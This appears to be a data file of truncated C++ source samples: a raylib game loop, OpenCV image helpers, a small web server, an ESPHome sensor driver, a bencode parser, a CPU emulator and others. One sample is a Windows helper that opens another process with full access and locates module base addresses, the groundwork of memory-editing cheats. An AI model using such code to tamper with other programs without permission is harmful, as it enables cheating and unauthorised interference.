    "/*\n *  Code guide:\n *  use types in bitsizeints.h over standard numeric types\n *  when interfacing with c ABI, prefer standard numeric types\n *\n *  avoid using namespace as to upkeep clarity\n *  instead specifically declare using for very commonly used members of the namespace\n *  don't:\n *  using namespace std;\n *  do:\n *  using std::string;\n */\n\n#include <filesystem>\n\n#include \"clinkinterface.hpp\"\n#include \"player.hpp\"\n#include \"raylib.h\"\n#include \"raymath.h\"\n#include \"rlgl.h\"\n\n#include \"render.hpp\"\n#include \"mod_registry.hpp\"\n#include \"event_register.hpp\"\n\n#include \"bitsize_ints.h\"\n#include \"clinkAPI.hpp\"\n#include \"main.hpp\"\n#include \"render.hpp\"\n#include \"exceptions.hpp\"\n#include \"registry.hpp\"\n\nnamespace rl = raylib;\nusing namespace std::chrono_literals;\nusing namespace registry_literals;\n\n// #include \"zig.h\"\n\nint main(int argc, char* argv[]) {\n    #if defined(DEBUG)\n    // disable most logs\n    rl::SetTraceLogLevel(rl::LOG_WARNING);\n    #else\n    // release gets less logs\n    rl::SetTraceLogLevel(rl::LOG_ERROR);\n    #endif\n\n    rl::SetWindowState(rl::FLAG_WINDOW_RESIZABLE);\n    rl::InitWindow(\n        rl::GetMonitorWidth(rl::GetCurrentMonitor()),\n        rl::GetMonitorHeight(rl::GetCurrentMonitor()),\n        \"Clink\"\n    );\n    rl::SetTargetFPS(60);\n\n    ModRegister mod_register = ModRegister();\n    EventRegister event_register = EventRegister();\n\n    auto light_renderer = LightRenderer();\n    auto player_light = light_renderer.addLight(0.0, 0.0, 600);\n    Player player = Player(player_light);\n    \n    PlayerAPI player_api = PlayerAPI(player);\n    ClinkAPI api = ClinkAPI(&player_api, event_register, mod_register);\n    // load in engine mods\n    // brings the clink namespace into the registry's scope\n    auto base_mod_load_result = mod_register.loadMods(\"./base_mods\", &api);\n    // if base mods fail it will error later anyway\n    if(base_mod_load_result != ModError::OK)\n        exit(-1);\n\n    // defined by clink base mod\n    auto update_event_id = api.getEventIdByName(\"clink::update\"_ModMember).value();\n    auto draw_event_id = api.getEventIdByName(\"clink::draw\"_ModMember).value();\n\n    mod_register.loadMods(\"./mods\", &api);\n\n    rl::Image img = rl::GenImageChecked(\n        64,\n        64,\n        32,\n        32,\n        rl::BLACK,\n        rl::DARKGRAY\n    );\n    rl::Texture2D background_texture = LoadTextureFromImage(img);\n    rl::UnloadImage(img);\n\n    std::vector<rl::Rectangle> boxes = std::vector<rl::Rectangle>();\n    setupBoxes(boxes, 20);\n\n    rl::RenderTexture light_mask = rl::LoadRenderTexture(rl::GetScreenWidth(), rl::GetScreenHeight());\n\n    bool show_lines = false;\n\n    f32 dt = 0;\n    while(!rl::WindowShouldClose()) {\n        dt = rl::GetFrameTime();\n        for(auto callback : api.getEvent(update_event_id)) {\n            as(fn(void, f32), callback)(dt);\n        }\n\n        // Make a new light\n        if (rl::IsMouseButtonPressed(rl::MOUSE_BUTTON_RIGHT)) {\n            light_renderer.addLight(rl::GetMousePosition().x, rl::GetMousePosition().y, 200);\n        }\n\n        // Toggle debug info\n        if (rl::IsKeyPressed(rl::KEY_F1))\n            show_lines = !show_lines;\n\n        // Update the lights and keep track if any were dirty so we know if we need to update the master light mask\n        bool dirty_lights = false;\n        for(auto& light: lights) {\n            dirty_lights = light.update(boxes) || dirty_lights;\n        }\n\n        // Update the light mask\n        if (dirty_lights) {\n            // Build up the light mask\n            rl::BeginTextureMode(light_mask);\n            \n                rl::ClearBackground(rl::BLACK);\n\n                // Force the blend mode to only set the alpha of the destination\n                rl::rlSetBlendFactors(RLGL_SRC_ALPHA, RLGL_SRC_ALPHA, RLGL_MIN);\n                rl::rlSetBlendMode(rl::BLEND_CUSTOM);\n\n                // Merge in all the light masks\n                for(auto& light : lights) {\n                    if (light.active)\n                        DrawTextureRec(\n                            light.mask.texture,\n                            rl::Rectangle{ 0, 0, as(float, rl::GetScreenWidth()), -as(float, rl::GetScreenHeight()) },\n                            rl::Vector2Zero(),\n                            rl::WHITE\n                    );\n                }\n\n                rl::rlDrawRenderBatchActive();\n\n                // Go back to normal blend\n                rl::rlSetBlendMode(rl::BLEND_ALPHA);\n            rl::EndTextureMode();\n        }\n\n        \n        rl::BeginDrawing();\n\n            rl::ClearBackground(rl::BLACK);\n            \n            // Draw the tile background\n            rl::DrawTextureRec(\n                background_texture,\n                rl::Rectangle{ 0, 0, as(float, rl::GetScreenWidth()), as(float, rl::GetScreenHeight()) },\n                rl::Vector2Zero(),\n                rl::WHITE\n            );\n            \n            // draw the boxes\n            for (auto& box : boxes)\n            {\n                if (rl::CheckCollisionRecs(b",
    "\ufeff#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\n#include <malloc.h>\n\n\n#include<stdio.h>\n#include <opencv2/opencv.hpp>\n\nusing namespace cv;\n\ntypedef struct {\n\tint r, g, b;\n}int_rgb;\n\n\nint** IntAlloc2(int height, int width)\n{\n\tint** tmp;\n\ttmp = (int**)calloc(height, sizeof(int*));\n\tfor (int i = 0; i < height; i++)\n\t\ttmp[i] = (int*)calloc(width, sizeof(int));\n\treturn(tmp);\n}\n\nvoid IntFree2(int** image, int height, int width)\n{\n\tfor (int i = 0; i < height; i++)\n\t\tfree(image[i]);\n\n\tfree(image);\n}\n\n\nfloat** FloatAlloc2(int height, int width)\n{\n\tfloat** tmp;\n\ttmp = (float**)calloc(height, sizeof(float*));\n\tfor (int i = 0; i < height; i++)\n\t\ttmp[i] = (float*)calloc(width, sizeof(float));\n\treturn(tmp);\n}\n\nvoid FloatFree2(float** image, int height, int width)\n{\n\tfor (int i = 0; i < height; i++)\n\t\tfree(image[i]);\n\n\tfree(image);\n}\n\nint_rgb** IntColorAlloc2(int height, int width)\n{\n\tint_rgb** tmp;\n\ttmp = (int_rgb**)calloc(height, sizeof(int_rgb*));\n\tfor (int i = 0; i < height; i++)\n\t\ttmp[i] = (int_rgb*)calloc(width, sizeof(int_rgb));\n\treturn(tmp);\n}\n\nvoid IntColorFree2(int_rgb** image, int height, int width)\n{\n\tfor (int i = 0; i < height; i++)\n\t\tfree(image[i]);\n\n\tfree(image);\n}\n\nint** ReadImage(char* name, int* height, int* width)\n{\n\tMat img = imread(name, IMREAD_GRAYSCALE);\n\tint** image = (int**)IntAlloc2(img.rows, img.cols);\n\n\t*width = img.cols;\n\t*height = img.rows;\n\n\tfor (int i = 0; i < img.rows; i++)\n\t\tfor (int j = 0; j < img.cols; j++)\n\t\t\timage[i][j] = img.at<unsigned char>(i, j);\n\n\treturn(image);\n}\n\nvoid WriteImage(char* name, int** image, int height, int width)\n{\n\tMat img(height, width, CV_8UC1);\n\tfor (int i = 0; i < height; i++)\n\t\tfor (int j = 0; j < width; j++)\n\t\t\timg.at<unsigned char>(i, j) = (unsigned char)image[i][j];\n\n\timwrite(name, img);\n}\n\n\nvoid ImageShow(char* winname, int** image, int height, int width)\n{\n\tMat img(height, width, CV_8UC1);\n\tfor (int i = 0; i < height; i++)\n\t\tfor (int j = 0; j < width; j++)\n\t\t\timg.at<unsigned char>(i, j) = (unsigned char)image[i][j];\n\timshow(winname, img);\n\twaitKey(0);\n}\n\n\n\nint_rgb** ReadColorImage(char* name, int* height, int* width)\n{\n\tMat img = imread(name, IMREAD_COLOR);\n\tint_rgb** image = (int_rgb**)IntColorAlloc2(img.rows, img.cols);\n\n\t*width = img.cols;\n\t*height = img.rows;\n\n\tfor (int i = 0; i < img.rows; i++)\n\t\tfor (int j = 0; j < img.cols; j++) {\n\t\t\timage[i][j].b = img.at<Vec3b>(i, j)[0];\n\t\t\timage[i][j].g = img.at<Vec3b>(i, j)[1];\n\t\t\timage[i][j].r = img.at<Vec3b>(i, j)[2];\n\t\t}\n\n\treturn(image);\n}\n\nvoid WriteColorImage(char* name, int_rgb** image, int height, int width)\n{\n\tMat img(height, width, CV_8UC3);\n\tfor (int i = 0; i < height; i++)\n\t\tfor (int j = 0; j < width; j++) {\n\t\t\timg.at<Vec3b>(i, j)[0] = (unsigned char)image[i][j].b;\n\t\t\timg.at<Vec3b>(i, j)[1] = (unsigned char)image[i][j].g;\n\t\t\timg.at<Vec3b>(i, j)[2] = (unsigned char)image[i][j].r;\n\t\t}\n\n\timwrite(name, img);\n}\n\nvoid ColorImageShow(char* winname, int_rgb** image, int height, int width)\n{\n\tMat img(height, width, CV_8UC3);\n\tfor (int i = 0; i < height; i++)\n\t\tfor (int j = 0; j < width; j++) {\n\t\t\timg.at<Vec3b>(i, j)[0] = (unsigned char)image[i][j].b;\n\t\t\timg.at<Vec3b>(i, j)[1] = (unsigned char)image[i][j].g;\n\t\t\timg.at<Vec3b>(i, j)[2] = (unsigned char)image[i][j].r;\n\t\t}\n\timshow(winname, img);\n\n}\n\ntemplate <typename _TP>\nvoid ConnectedComponentLabeling(_TP** seg, int height, int width, int** label, int* no_label)\n{\n\n\t//Mat bw = threshval < 128 ? (img < threshval) : (img > threshval);\n\tMat bw(height, width, CV_8U);\n\n\tfor (int i = 0; i < height; i++) {\n\t\tfor (int j = 0; j < width; j++)\n\t\t\tbw.at<unsigned char>(i, j) = (unsigned char)seg[i][j];\n\t}\n\tMat labelImage(bw.size(), CV_32S);\n\t*no_label = connectedComponents(bw, labelImage, 8); // 0        \u0535        \n\n\t(*no_label)--;\n\n\tfor (int i = 0; i < height; i++) {\n\t\tfor (int j = 0; j < width; j++)\n\t\t\tlabel[i][j] = labelImage.at<int>(i, j);\n\t}\n}\n\n#define imax(x, y) ((x)>(y) ? x : y)\n#define imin(x, y) ((x)<(y) ? x : y)\n\nint BilinearInterpolation(int** image, int width, int height, double x, double y)\n{\n\tint x_int = (int)x;\n\tint y_int = (int)y;\n\n\tint A = image[imin(imax(y_int, 0), height - 1)][imin(imax(x_int, 0), width - 1)];\n\tint B = image[imin(imax(y_int, 0), height - 1)][imin(imax(x_int + 1, 0), width - 1)];\n\tint C = image[imin(imax(y_int + 1, 0), height - 1)][imin(imax(x_int, 0), width - 1)];\n\tint D = image[imin(imax(y_int + 1, 0), height - 1)][imin(imax(x_int + 1, 0), width - 1)];\n\n\tdouble dx = x - x_int;\n\tdouble dy = y - y_int;\n\n\tdouble value\n\t\t= (1.0 - dx) * (1.0 - dy) * A + dx * (1.0 - dy) * B\n\t\t+ (1.0 - dx) * dy * C + dx * dy * D;\n\n\treturn((int)(value + 0.5));\n}\n\n\nvoid DrawHistogram(char* comments, int* Hist)\n{\n\tint histSize = 256; /// Establish the number of bins\n\t// Draw the histograms for B, G and R\n\tint hist_w = 512; int hist_h = 512;\n\tint bin_w = cvRound((double)hist_w / histSize);\n\n\tMat histImage(hist_h, hist_w, CV_8UC3, Scalar(255, 255, 255));\n\tMat r_hist(histSize, 1, CV_32FC1);\n\tfor (int i = 0; i < histSize; i++)\n\t\tr_hist.at<float>(i, 0) = Hist",
    "#include \"memory.h\"\r\n\r\nmemory::memory(std::string_view procN)\r\n{\r\n\tPROCESSENTRY32 entry{};\r\n\tentry.dwSize = sizeof(PROCESSENTRY32);\r\n\r\n\tHANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\r\n\r\n\tif (Process32First(snapshot, &entry))\r\n\t{\r\n\t\tif (!procN.compare(entry.szExeFile))\r\n\t\t{\r\n\t\t\tprocID = entry.th32ProcessID;\r\n\t\t\tprocH = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\twhile (Process32Next(snapshot, &entry))\r\n\t\t\t{\r\n\t\t\t\tif (!procN.compare(entry.szExeFile))\r\n\t\t\t\t{\r\n\t\t\t\t\tprocID = entry.th32ProcessID;\r\n\t\t\t\t\tprocH = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procID);\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t}\r\n\tif (snapshot)\r\n\t{\r\n\t\tCloseHandle(snapshot);\r\n\t}\r\n}\r\n\r\nstd::uintptr_t memory::GetModuleBaseAddr(std::string_view moduleN) const\r\n{\r\n\tMODULEENTRY32 entry{};\r\n\tentry.dwSize = sizeof(MODULEENTRY32);\r\n\r\n\tHANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, procID);\r\n\r\n\tstd::uintptr_t result{};\r\n\r\n\tif (Module32First(snapshot, &entry))\r\n\t{\r\n\t\tif (!moduleN.compare(entry.szModule))\r\n\t\t{\r\n\t\t\tresult = reinterpret_cast<std::uintptr_t>(entry.modBaseAddr);\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\twhile (Module32Next(snapshot, &entry))\r\n\t\t\t{\r\n\t\t\t\tif (!moduleN.compare(entry.szModule))\r\n\t\t\t\t{\r\n\t\t\t\t\tresult = reinterpret_cast<std::uintptr_t>(entry.modBaseAddr);\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t}\r\n\tif (snapshot)\r\n\t{\r\n\t\tCloseHandle(snapshot);\r\n\t}\r\n\treturn result;\r\n}",
    "#include \"Food.h\"\n#include <iostream>\nusing std::cout;\nusing std::endl;\nFood::Food(const char* name, const size_t& kkal, const size_t& weight)\n{\n\tsetName(name);\n\tsetKkal(kkal);\n\tsetWeight(weight);\n}\nFood::~Food()\n{\n\tif (name != nullptr)\n\t{\n\t\tcout << \"\\n \\t\\t Dtor for \" << name << \" done \" << endl;\n\t\tdelete[] name;\n\t\tname = nullptr;\n\t}\n}\nFood::Food(const Food& other)\n{\n\t//this->name = other.name; // *ptr1 = *ptr2 -- bad!!!\n\tsetName(other.name);\n\tthis->kkal = other.kkal;\n\tthis->weight = other.weight;\n}\nvoid Food::operator=(const Food& other)\n{\n\tsetName(other.name);\n\tthis->kkal = other.kkal;\n\tthis->weight = other.weight;\n}\nvoid Food::setName(const char* name)\n{\n\t// memory leak\n\tif (this->name != nullptr)\n\t\tdelete[] this->name;\n\tsize_t size = strlen(name) + 1;\n\tthis->name = new char[size];\n\tstrcpy_s(this->name, size, name);\n}\n\nvoid Food::print() const\n{\n\tcout << endl;\n\tcout << \"\\t Food   :: \" << name << endl;\n\tcout << \"\\t Kkal   :: \" << kkal << endl;\n\tcout << \"\\t Weight :: \" << weight << endl;\n}\nsize_t Food::counter = 0;",
    "#include <iostream>\n#include <string>\n#include <thread>\n#include <unordered_map>\n#include <functional>\n#include <asio.hpp>\n#include <fstream>\n#include <sstream>\n#include <filesystem>\n#include <chrono>\n#include <iomanip>\n#include <ctime>\n\nusing asio::ip::tcp;\nnamespace fs = std::filesystem;\n\nclass Logger {\npublic:\n    Logger(const std::string& filename)\n        : log_file_(filename, std::ios::app)\n    {\n        if (!log_file_.is_open()) {\n            throw std::runtime_error(\"Failed to open log file\");\n        }\n    }\n\n    void log(const std::string& client_ip, const std::string& request, const std::string& status)\n    {\n        std::lock_guard<std::mutex> guard(log_mutex_);\n\n        std::string timestamp = getTimestamp();\n        std::string log_entry = client_ip + \" - - [\" + timestamp + \"] \\\"\" + request + \"\\\" \" + status;\n\n        // Log to console\n        std::cout << log_entry << std::endl;\n\n        // Log to file\n        log_file_ << log_entry << std::endl;\n    }\n\nprivate:\n    std::ofstream log_file_;\n    std::mutex log_mutex_;\n\n    std::string getTimestamp()\n    {\n        auto now = std::chrono::system_clock::now();\n        std::time_t now_time = std::chrono::system_clock::to_time_t(now);\n        std::tm now_tm = *std::localtime(&now_time);\n\n        std::ostringstream timestamp;\n        timestamp << std::put_time(&now_tm, \"%d/%b/%Y:%H:%M:%S %z\");\n\n        return timestamp.str();\n    }\n};\n\nclass WebServer {\npublic:\n    WebServer(unsigned short port, Logger& logger)\n        : acceptor_(io_context_, tcp::endpoint(tcp::v4(), port))\n        , logger_(logger)\n    {\n        startAccept();\n    }\n\n    void addRoute(const std::string& route, std::function<std::string()> handler)\n    {\n        routes_[route] = handler;\n    }\n\n    void addFileProviderRoute(const std::string& route_prefix, const std::string& folder_path)\n    {\n        routes_[route_prefix] = [this, folder_path, route_prefix]() {\n            try {\n                std::string sanitized_path = sanitizePath(route_prefix, folder_path);\n                if (fs::exists(sanitized_path) && fs::is_regular_file(sanitized_path)) {\n                    std::ifstream file(sanitized_path, std::ios::binary);\n                    std::ostringstream ss;\n                    ss << file.rdbuf();\n                    return ss.str();\n                } else {\n                    return \"404 File Not Found\";\n                }\n            } catch (const std::runtime_error& e) {\n                return \"403 Forbidden: \" + std::string(e.what());\n            }\n        };\n    }\n\n    void run()\n    {\n        io_context_.run();\n    }\n\nprivate:\n    void startAccept()\n    {\n        auto socket = std::make_shared<tcp::socket>(io_context_);\n        acceptor_.async_accept(*socket, [this, socket](std::error_code ec) {\n            if (!ec) {\n                std::thread(&WebServer::handleRequest, this, socket).detach();\n            }\n            startAccept();\n        });\n    }\n\n    void handleRequest(std::shared_ptr<tcp::socket> socket)\n    {\n        try {\n            char buffer[1024];\n            std::error_code error;\n            size_t length = socket->read_some(asio::buffer(buffer), error);\n\n            if (!error) {\n                std::string request(buffer, length);\n                std::string client_ip = socket->remote_endpoint().address().to_string();\n                std::string route = parseRoute(request);\n                std::string status;\n\n                std::string response;\n                if (routes_.find(route) != routes_.end()) {\n                    response = \"HTTP/1.1 200 OK\\r\\nContent-Type: text/plain\\r\\n\\r\\n\" + routes_[route]();\n                    status = \"200 OK\";\n                } else {\n                    response = \"HTTP/1.1 404 Not Found\\r\\nContent-Type: text/plain\\r\\n\\r\\nRoute Not Found\";\n                    status = \"404 Not Found\";\n                }\n\n                asio::write(*socket, asio::buffer(response));\n\n                // Log the request with nginx-style format\n                logger_.log(client_ip, \"GET \" + route, status);\n            }\n        } catch (std::exception& e) {\n            logger_.log(\"unknown\", \"error\", \"500 Internal Server Error\");\n        }\n    }\n\n    std::string parseRoute(const std::string& request)\n    {\n        size_t start = request.find(\"GET \") + 4;\n        size_t end = request.find(\" \", start);\n        return request.substr(start, end - start);\n    }\n\n    std::string sanitizePath(const std::string& route_prefix, const std::string& base_path)\n    {\n        // Ensure the request doesn't include \"..\" to avoid directory traversal\n        fs::path requested_path = fs::path(route_prefix).filename();\n\n        // Ensure the path is within the public folder by resolving relative path\n        fs::path full_path = fs::canonical(base_path / requested_path);\n\n        // Check if the resolved path starts with the base folder (i.e., within /public)\n        if (full_path.string().find(fs::canonical(base_path).string()) == 0) {\n            r",
    "#include \"dfrobot_sen0575_i2c.h\"\n#include \"esphome/core/helpers.h\"\n#include \"esphome/core/log.h\"\n\nnamespace esphome {\nnamespace dfrobot_sen0575_i2c {\n\nstatic const uint8_t REGISTER_PRODUCT_ID = 0x00;\nstatic const uint8_t REGISTER_VENDOR_ID = 0x02;\nstatic const uint8_t REGISTER_VERSION = 0x0A;\nstatic const uint8_t REGISTER_TIME_RAINFALL = 0x0C;\nstatic const uint8_t REGISTER_CUMULATIVE_RAINFALL = 0x10;\nstatic const uint8_t REGISTER_RAW_DATA = 0x14;\nstatic const uint8_t REGISTER_SYSTEM_TIME = 0x18;\nstatic const uint8_t REGISTER_RAIN_HOUR = 0x26;\nstatic const uint8_t REGISTER_BASE_RAINFALL = 0x28;\n\nstatic const char *const TAG = \"dfrobot_sen0575_i2c.sensor\";\n\nvoid DFRobotSen0575I2C::setup() {\n  ESP_LOGCONFIG(TAG, \"Setting up DFRobot SEN0575 ...\");\n  if (!this->initialize_sensor_()) {\n    ESP_LOGE(TAG, \"Failed to initialize sensor\");\n    this->mark_failed();\n    return;\n  }\n  ESP_LOGCONFIG(TAG, \"Setup complete. (Firmware: %s)\", this->get_firmware_version_().c_str());\n}\n\nvoid DFRobotSen0575I2C::loop() {}\n\nvoid DFRobotSen0575I2C::update() {\n  if (this->cumulative_rainfall_ != nullptr) {\n    float rainfall = this->get_rainfall_();\n    this->cumulative_rainfall_->publish_state(rainfall);\n  }\n  if (this->rainfall_within_hour_ != nullptr) {\n    float rainfall_hours = this->get_rainfall_for_period_(this->rainfall_hours_);\n    this->rainfall_within_hour_->publish_state(rainfall_hours);\n  }\n  if (this->raw_data_ != nullptr) {\n    uint32_t raw_data = this->get_raw_data_();\n    this->raw_data_->publish_state(raw_data);\n  }\n  if (this->working_time_ != nullptr) {\n    float working_time = this->get_working_time_();\n    this->working_time_->publish_state(working_time);\n  }\n}\n\nvoid DFRobotSen0575I2C::dump_config() {\n  ESP_LOGCONFIG(TAG, \"DFRobot Sen0575 I2C:\");\n  LOG_I2C_DEVICE(this);\n  LOG_UPDATE_INTERVAL(this);\n\n  // uncomment the following lines to show the state of the sensor at config for debbugging purposes\n  // ESP_LOGCONFIG(TAG, \"Init: %s\", this->initialize_sensor_()? \"OK\" : \"Failed\");\n  // ESP_LOGCONFIG(TAG, \"Firmware: %s\", this->get_firmware_version_().c_str());\n  // ESP_LOGCONFIG(TAG, \"Cumulative Rainfall: %.2f\", this->get_rainfall_());\n  // ESP_LOGCONFIG(TAG, \"Rainfall Within Hour: %.2f\", this->get_rainfall_for_period_(1));\n  // ESP_LOGCONFIG(TAG, \"Raw Data: %d\", this->get_raw_data_());\n  // ESP_LOGCONFIG(TAG, \"Working Time: %.2f\", this->get_working_time_());\n\n  if (this->is_failed()) {\n    ESP_LOGE(TAG, \"Communication with DFRobot SEN0575 failed!\");\n    if ((this->component_state_ & COMPONENT_STATE_MASK) == COMPONENT_STATE_FAILED) {\n      this->component_state_ &= ~COMPONENT_STATE_MASK;\n      this->component_state_ |= COMPONENT_STATE_CONSTRUCTION;\n      ESP_LOGD(TAG, \"Resetting state to construction\");\n    }\n  }\n\n  ESP_LOGCONFIG(TAG, \"Rainfall Hour(s): %d\", this->rainfall_hours_);\n\n  LOG_SENSOR(\"  \", \"Cumulative Rainfall\", this->cumulative_rainfall_);\n  LOG_SENSOR(\"  \", \"Rainfall Within Hour\", this->rainfall_within_hour_);\n  LOG_SENSOR(\"  \", \"Raw Data\", this->raw_data_);\n  LOG_SENSOR(\"  \", \"Working Time\", this->working_time_);\n}\n\nstd::string DFRobotSen0575I2C::get_firmware_version_() {\n  uint16_t version = 0;\n  uint8_t buffer[2] = {0};\n  this->read_register_(REGISTER_VERSION, buffer, 2);\n  version = buffer[0] | (static_cast<uint16_t>(buffer[1]) << 8);\n\n  std::string version_str = std::to_string(version >> 12) + '.' +\n                            std::to_string((version >> 8) & 0x0F) + '.' +\n                            std::to_string((version >> 4) & 0x0F) + '.' +\n                            std::to_string(version & 0x0F);\n  ESP_LOGD(TAG, \"DFRobot SEN0575 firmware version: %s\", version_str.c_str());\n  return version_str;\n}\n\nfloat DFRobotSen0575I2C::get_rainfall_() {\n  uint8_t buffer[4] = {0};\n  this->read_register_(REGISTER_CUMULATIVE_RAINFALL, buffer, 4);\n  uint32_t rainfall = (buffer[0] | (buffer[1] << 8) | (buffer[2] << 16) | (buffer[3] << 24));\n  ESP_LOGD(TAG, \"DFRobot SEN0575 rainfall: %.2f\", rainfall / 10000.0f);\n  return rainfall / 10000.0f;\n}\n\nfloat DFRobotSen0575I2C::get_rainfall_for_period_(uint8_t hours) {\n  this->write_register_(REGISTER_RAIN_HOUR, &hours, 1);\n  uint8_t buffer[4] = {0};\n  if (this->read_register_(REGISTER_TIME_RAINFALL, buffer, 4) == 0) {\n    return -1;\n  }\n  uint32_t rainfall = (buffer[0] | (buffer[1] << 8) | (buffer[2] << 16) | (buffer[3] << 24));\n  ESP_LOGD(TAG, \"DFRobot SEN0575 rainfall (%d h): %.2f\", hours, rainfall / 10000.0f);\n  return rainfall / 10000.0f;\n}\n\nuint32_t DFRobotSen0575I2C::get_raw_data_() {\n  uint8_t buffer[4] = {0};\n  this->read_register_(REGISTER_RAW_DATA, buffer, 4);\n  uint32_t raw_data = (buffer[0] | (buffer[1] << 8) | (buffer[2] << 16) | (buffer[3] << 24));\n  ESP_LOGD(TAG, \"DFRobot SEN0575 raw data: %d\", raw_data);\n  return raw_data;\n}\n\nfloat DFRobotSen0575I2C::get_working_time_() {\n  uint8_t buffer[2] = {0};\n  this->read_register_(REGISTER_SYSTEM_TIME, buffer, 2);\n  uint16_t working_time = (buffer[0] | (buffer[1] << 8));\n  ESP_LOGD(TAG, \"DFRobot SEN0575 working",
    "#include \"parser.h\"\n\n/* TODO: identify dictionary, and parse */\n\nstatic bool valid_index(int index, int len)\n{\n    return index < len - 1;\n}\n\nbool is_int(int index, std::string_view& file_content)\n{\n    return valid_index(index, file_content.length()) && file_content[index] == 'i' && (file_content[index+1] >= '0' && file_content[index+1] <= '9' || file_content[index+1] == '-');\n}\n\nbool is_string(int index, std::string_view& file_content)\n{\n    return valid_index(index, file_content.length()) && file_content[index] >= '0' && file_content[index] <= '9';\n}\n\nbool is_list(int index, std::string_view& file_content)\n{\n    return valid_index(index, file_content.length()) && file_content[index] == 'l';\n}\n\nBencodeElementPtr parse_int(int& index, std::string_view& file_content)\n{\n    int num_len = 0, num = 0;\n    int length = file_content.length();\n\n    int j = index;\n    int had_minus = 0;\n    while(file_content[++j] != 'e' && j < length) {\n        if (file_content[j] == '-')\n            had_minus = 1;\n        else\n            num_len++;\n    }\n\n    int num_len_cpy = num_len + had_minus;\n    for(j = 0; j < num_len_cpy; j++) {\n        if(file_content[j+index+1] != '-') {\n            num += (file_content[j+index+1] - '0') * static_cast<int>(pow(10,num_len-1));\n            num_len--;\n        }\n    }\n    if(had_minus == 1)\n        num *= -1;\n\n    if(index + j + 2 <= length)\n        index += j + 2;\n    else\n        index = -1;\n\n\n    return std::make_shared<BencodeElement>(num);\n}\n\nBencodeElementPtr parse_string(int& index, std::string_view& file_content)\n{\n    int file_legnth = file_content.length();\n    int len_size = 0, i = index, len = 0;\n\n    while(file_content[i++] != ':' && i < file_legnth) len_size++;\n    int start_index = i, len_size_cpy = len_size;\n\n    for(i = 0; i < len_size_cpy; i++) {\n        len += (file_content[i+index] - '0') * static_cast<int>(pow(10, len_size-1));\n        len_size--;\n    }\n    /*\n    if(start_index + len <= file_legnth)\n        index = start_index+len;\n    else\n        index = -1;\n        */\n    index = start_index + len-1;\n\n    return std::make_shared<BencodeElement>(file_content.substr(start_index, len));\n}\n\nBencodeElementPtr parse_list(int& index, std::string_view& file_content)\n{\n    std::vector<BencodeElementPtr> list;\n\n    // +1 if starting at literal 'l'\n    int i = index;\n    while(i < file_content.size() && file_content[i++] != 'e' && i != -1) {\n        if(is_int(i, file_content))\n            list.push_back(parse_int(i, file_content));\n        else if(is_string(i, file_content))\n            list.push_back(parse_string(i, file_content));\n        else if(is_list(i, file_content))\n            list.push_back(parse_list(i, file_content));\n        else\n            return nullptr;\n    }\n\n    return std::make_shared<BencodeElement>(list);\n}\n\nint parse_file(std::string_view file_content)\n{\n    int length = file_content.length();\n    for(int i = 0; i < length; i++) {\n        // TODO\n    }\n\n    return EXIT_SUCCESS;\n}\n",
    "#include \"R828.h\"\n\n#include <iostream>\n#include <fstream>\n\nnamespace R828 {\n\nvoid CPU::Reset() {\n\tm_Regs.pc = PROGRAM_START;\n\tm_Regs.sp = STACK_START;\n\tm_Regs.clsp = CALL_STACK_START;\n\n\tm_Regs.r0\t\t\t= 0x0000;\n\tm_Regs.r1\t\t\t= 0x0000;\n\tm_Regs.r2\t\t\t= 0x0000;\n\tm_Regs.r3\t\t\t= 0x0000;\n\tm_Regs.r4\t\t\t= 0x0000;\n\tm_Regs.r5\t\t\t= 0x0000;\n\tm_Regs.r6\t\t\t= 0x0000;\n\tm_Regs.r7\t\t\t= 0x0000;\n\tm_Regs.r8\t\t\t= 0x0000;\n\tm_Regs.r9\t\t\t= 0x0000;\n\tm_Regs.r10\t\t\t= 0x0000;\n\tm_Regs.r11\t\t\t= 0x0000;\n\n\tm_Regs.cfr\t\t\t= 0x0000;\n\n\tfor (size_t i = 0 ; i < MEMORY_CAPACITY ; i++) {\n\t\tdata[i] = 0x00;\n\t}\n}\n\nvoid CPU::LoadProgram(std::vector<Byte> programBytes) {\n\tfor (Word i = 0 ; i < programBytes.size() && m_Regs.pc + i < MEMORY_CAPACITY ; i++) {\n\t\tdata[m_Regs.pc + i] = programBytes[i];\n\t}\n}\n\nvoid CPU::LoadProgram(std::string filePath) {\n\tstd::ifstream file(filePath, std::ios::binary);\n\tif (!file) {\n\t\tERROR(\"Unable to open file!\");\n\t\texit(1);\n\t}\n\n\tfile.seekg(0, std::ios::end);\n    std::streamsize size = file.tellg();\n    file.seekg(0, std::ios::beg);\n\n\tstd::vector<Byte> program(size);\n\n\tif (!file.read(reinterpret_cast<char*>(program.data()), size)) {\n\t\tERROR(\"Unable to read file!\");\n\t\texit(1);\n    }\n\n\tfor (Word i = 0 ; i < program.size() && m_Regs.pc + i < MEMORY_CAPACITY ; i++) {\n\t\tdata[m_Regs.pc + i] = program[i];\n\t}\n}\n\nvoid CPU::Execute(int cycles) {\n\twhile (cycles > 0) {\n\t\tByte inst = FetchByte(cycles);\n\t\tswitch (inst) {\n\t\tcase MOV_IM: {\n\t\t\tWord *dest = FetchRegisterU16(cycles);\n\t\t\tWord value = FetchWord(cycles);\n\t\t\t*dest = value;\n\t\t\tcycles--;\n\t\t} break;\n\t\tcase MOV_R: {\n\t\t\tWord *dest = FetchRegisterU16(cycles);\n\t\t\tWord *reg = FetchRegisterU16(cycles);\n\t\t\t*dest = *reg;\n\t\t\tcycles--;\n\t\t} break;\n\t\tcase MOV_A: {\n\t\t\tWord *dest = FetchRegisterU16(cycles);\n\t\t\tByte dataType = FetchByte(cycles);\n\t\t\tWord addr = FetchWord(cycles);\n\t\t\t\n\t\t\tswitch (dataType) {\n\t\t\tcase DTBYTE: {\n\t\t\t\t*dest = data[addr];\n\t\t\t\tcycles--;\n\t\t\t} break;\n\t\t\tcase DTWORD: {\n\t\t\t\t*dest = ((Word)data[addr]) | ((Word)data[addr + 1] << 